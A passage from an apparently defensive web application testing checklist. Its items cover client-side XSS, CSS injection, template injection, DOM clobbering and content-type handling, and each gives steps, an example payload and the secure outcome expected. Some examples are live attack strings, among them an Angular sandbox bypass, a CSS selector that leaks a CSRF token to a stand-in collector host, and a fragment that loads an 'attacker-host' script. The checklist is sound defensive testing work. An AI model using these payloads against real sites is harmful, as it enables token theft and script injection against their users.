  *Objective:* Finds client-side sinks that execute attacker content only after the victim pastes it into the page.  
  *Steps:*
  1. Find client-side functions that strip HTML tags using innerHTML and then read textContent.
  2. Craft an HTML payload designed to survive the strip step, such as an img tag with an onerror handler.
  3. Paste the payload into the field in the browser and submit it.
  4. Check the developer console for the payload executing.
  *Example:* `<img src=x onerror=alert(1) /> pasted into a textarea whose submit handler reads innerHTML then textContent`  
  *Expected:* The page never relies on a user pasting raw markup into a sink that can re-parse it as HTML.  
  *Refs:* wstg: WSTG-CLNT-01; cheatsheet: DOM_based_XSS_Prevention_Cheat_Sheet; cwe: CWE-79; capec: CAPEC-588

- [ ] **WEB-XSS-008** Test JavaScript injection sinks outside script tags  
  *Severity if fail:* Medium | *Type:* Manual  
  *Objective:* Finds JavaScript execution sinks reachable without a literal script tag, such as eval or location assignment.  
  *Steps:*
  1. Review the page for sinks such as eval, setTimeout, setInterval and window.location assignment that use untrusted data.
  2. Submit a javascript: scheme payload where the sink assigns a user-controlled value to a navigation property.
  3. Confirm execution in the browser developer console.
  *Example:* `www.target.com/?javascript:alert(1) read by window.location=decodeURIComponent(location.search.substring(1))`  
  *Expected:* User-controlled values never reach eval, setTimeout, setInterval or a navigation sink without validation.  
  *Refs:* wstg: WSTG-CLNT-02; cheatsheet: DOM_based_XSS_Prevention_Cheat_Sheet; cwe: CWE-79, CWE-95; capec: CAPEC-19

- [ ] **WEB-XSS-009** Test client-side HTML injection sinks  
  *Severity if fail:* Medium | *Type:* Manual | *Level:* ASVS L1  
  *Objective:* Finds client-side code that writes untrusted data into innerHTML or document.write.  
  *Steps:*
  1. Find client-side code that writes a URL fragment, query parameter or API response into innerHTML or document.write.
  2. Submit an image tag with an onerror handler in the relevant input.
  3. Confirm the payload executes in the rendered page.
  *Example:* `https://target/page.html?user=<img%20src='x'%20onerror=alert(1)>`  
  *Expected:* Untrusted data is written only through safe text sinks, or is sanitized with a vetted library before reaching innerHTML.  
  *Refs:* wstg: WSTG-CLNT-03; asvs: V3.2.2; cheatsheet: Cross_Site_Scripting_Prevention_Cheat_Sheet; cwe: CWE-79, CWE-83; capec: CAPEC-63

- [ ] **WEB-XSS-010** Test CSS injection and CSS-based data exfiltration  
  *Severity if fail:* Medium | *Type:* Manual  
  *Objective:* Finds unsanitized CSS values that enable style injection or attribute-selector data theft.  
  *Steps:*
  1. Find a sink that assigns untrusted data to a style property or cssText.
  2. Submit a CSS value that changes page layout or injects a background-image URL pointing to a collector.
  3. If a token field is styled by value, craft an attribute selector probe to leak characters one at a time.
  *Example:* `location.hash fed to style.cssText = "color: "+hash ; CSS exfil: input[name=csrf_token][value^=a]{background-image:url(https://collaborator-host/log?a)}`  
  *Expected:* User-controlled values never reach a raw CSS sink, and CSS attribute-selector probing cannot read token values.  
  *Refs:* wstg: WSTG-CLNT-05; cwe: CWE-79; capec: CAPEC-63

- [ ] **WEB-XSS-011** Test client-side resource loading for injection in the request URL  
  *Severity if fail:* High | *Type:* Manual  
  *Objective:* Finds client-side code that loads a script or CORS resource from a URL taken from an untrusted source.  
  *Steps:*
  1. Find client-side code that assigns location.hash or a similar source to a script src or XHR URL.
  2. Craft a URL fragment pointing to an attacker-controlled script.
  3. Load the crafted link and confirm the attacker script executes and can read the response.
  *Example:* `www.target.com/#https://attacker-host/js.js loaded by d.src=location.hash.slice(1)`  
  *Expected:* Resource URLs built from client-controlled sources are validated against an allowlist before being loaded.  
  *Refs:* wstg: WSTG-CLNT-06; cwe: CWE-79, CWE-918; capec: CAPEC-63

- [ ] **WEB-XSS-012** Test client-side template rendering for CSTI  
  *Severity if fail:* High | *Type:* Manual  
  *Objective:* Finds client-side frameworks that evaluate user input as template expression syntax.  
  *Steps:*
  1. Identify the client-side framework from HTML attributes or the global object in the console.
  2. Submit the generic arithmetic probe {{7*7}} in the field reflected into the template.
  3. If rendered as 49, try a framework-specific sandbox-escape payload to reach arbitrary code execution.
  *Example:* `{{ 7*7 }} ; Angular 1.5.x sandbox bypass: {{x={"y":"".constructor.prototype};x["y"].charAt=[].join;$eval("x=alert(1)");}}`  
  *Expected:* User input is bound as data only and is never interpolated into template source that the framework parses as an expression.  
  *Refs:* wstg: WSTG-CLNT-15; cheatsheet: Server_Side_Template_Injection_Prevention_Cheat_Sheet; cwe: CWE-1336, CWE-79; capec: CAPEC-242

- [ ] **WEB-XSS-013** Test markup sanitization against DOM clobbering  
  *Severity if fail:* High | *Type:* Manual  
  *Objective:* Finds sanitized markup that keeps id or name attributes letting an attacker override a global reference.  
  *Steps:*
  1. Submit a probe anchor and image with distinctive id and name values into a field rendered as sanitized HTML.
  2. Open the rendered page and check window and document for the probe properties in the console.
  3. Review client-side code for default values and existence checks read from window or document that may be undefined.
  4. If a clobberable reference feeds a script src or a location assignment, build a clobbering payload for that sink.
  *Example:* `<a id="wstgprobe" name="wstgprobe" href="https://example.com/wstgprobe"></a><img name="wstgprobe2" src="https://example.com/wstgprobe2.png"> then check window.wstgprobe in console`  
  *Expected:* The sanitizer strips id and name attributes from user HTML, or client-side code never reads an unguarded value from window or document.  
  *Refs:* wstg: WSTG-CLNT-16; cheatsheet: DOM_Clobbering_Prevention_Cheat_Sheet; cwe: CWE-79

- [ ] **WEB-XSS-014** Test content rendering context to prevent incorrect HTML interpretation  
  *Severity if fail:* Medium | *Type:* Manual | *Level:* ASVS L1  
  *Objective:* Finds direct resources such as uploads or API responses that browsers may render as HTML in the wrong context.  
  *Steps:*
  1. Request an uploaded file or API response directly in the browser and inspect the returned Content-Type and Content-Disposition.
  2. Check whether the Sec-Fetch-Dest header is honored to block a navigation request for a non-document resource.
  3. Upload an HTML file and request it directly to see whether it renders as a page.
  *Example:* `GET /uploads/user1.html directly, and GET /api/data expecting application/json but served without a disposition header`  
  *Expected:* The server sets a correct Content-Type, uses an attachment disposition or a sandboxed response for user content, and never renders uploads as HTML.  
  *Refs:* asvs: V3.2.1; cwe: CWE-434; capec: CAPEC-650

- [ ] **WEB-XSS-015** Test client-side code for DOM clobbering safe coding practices  
  *Severity if fail:* Info | *Type:* Code Review | *Level:* ASVS L3  
  *Objective:* Finds global variable use that bypasses explicit declaration, type checking or namespace isolation.  
  *Steps:*
  1. Review client-side JavaScript for default values read from window or document without an explicit declaration.
  2. Check whether the code performs strict type checking before trusting a global reference.
  3. Check whether the application namespaces its globals instead of storing state directly on window or document.
  *Example:* `Example vulnerable pattern: const config = window.config || {}; without type checking or a namespaced container`  
  *Expected:* All globals are explicitly declared, strictly type-checked before use, and isolated in an application namespace.  
  *Refs:* asvs: V3.2.3; cheatsheet: DOM_Clobbering_Prevention_Cheat_Sheet; cwe: CWE-79
